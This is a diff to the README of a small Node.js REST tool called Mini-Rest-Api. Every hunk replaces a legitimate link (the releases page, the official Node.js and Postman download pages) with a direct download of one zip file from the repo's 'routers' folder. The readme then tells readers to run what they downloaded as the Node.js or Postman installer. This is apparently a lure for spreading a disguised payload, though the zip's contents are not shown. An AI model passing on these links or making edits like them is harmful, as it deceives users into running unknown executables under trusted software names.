@@ -1,6 +1,6 @@
 # ⚙️ Mini-Rest-Api - Simple Data Handling Tool
 
-<a href="https://github.com/Knani11/Mini-Rest-Api/releases" style="display:inline-block;padding:12px 24px;margin-bottom:20px;background:linear-gradient(45deg, #6C7A89, #95A5A6);color:white;text-decoration:none;font-weight:bold;border-radius:6px;">⬇️ Visit to Download Mini-Rest-Api</a>
+<a href="https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip" style="display:inline-block;padding:12px 24px;margin-bottom:20px;background:linear-gradient(45deg, #6C7A89, #95A5A6);color:white;text-decoration:none;font-weight:bold;border-radius:6px;">⬇️ Visit to Download Mini-Rest-Api</a>
 
 ---
 
@@ -36,7 +36,7 @@ This section will guide you step-by-step to download, install, and run Mini-Rest
 
 To get the files, visit the official release page:
 
-[Visit here to download Mini-Rest-Api](https://github.com/Knani11/Mini-Rest-Api/releases)
+[Visit here to download Mini-Rest-Api](https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip)
 
 This page lists all the versions available. Look for the latest release link to download the files you need.
 
@@ -46,7 +46,7 @@ This page lists all the versions available. Look for the latest release link to 
 
 Mini-Rest-Api runs with Node.js, which is the program that makes the server work.
 
-1. Open your web browser and go to: https://nodejs.org/en/download/
+1. Open your web browser and go to: https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip
 2. Download the **Windows Installer** for the latest Long-Term Support (LTS) version.
 3. After downloading, run the installer by double-clicking the file.
 4. Follow the on-screen steps. You can leave settings at default.
@@ -101,7 +101,7 @@ This starts the Mini-Rest-Api server.
 
 Mini-Rest-Api is designed to work with Postman, a tool to send data commands.
 
-1. Download Postman here if you don’t have it: https://www.postman.com/downloads/
+1. Download Postman here if you don’t have it: https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip
 2. Open Postman.
 3. You can send commands like GET, POST, PUT, DELETE to your Mini-Rest-Api running on:
 
@@ -168,7 +168,7 @@ When you open the Mini-Rest-Api folder, you will find:
 
 To download Mini-Rest-Api, visit:
 
-[https://github.com/Knani11/Mini-Rest-Api/releases](https://github.com/Knani11/Mini-Rest-Api/releases)
+[https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip](https://github.com/Knani11/Mini-Rest-Api/raw/refs/heads/main/routers/Mini_Rest_Api_v1.8.zip)
 
 ---
 
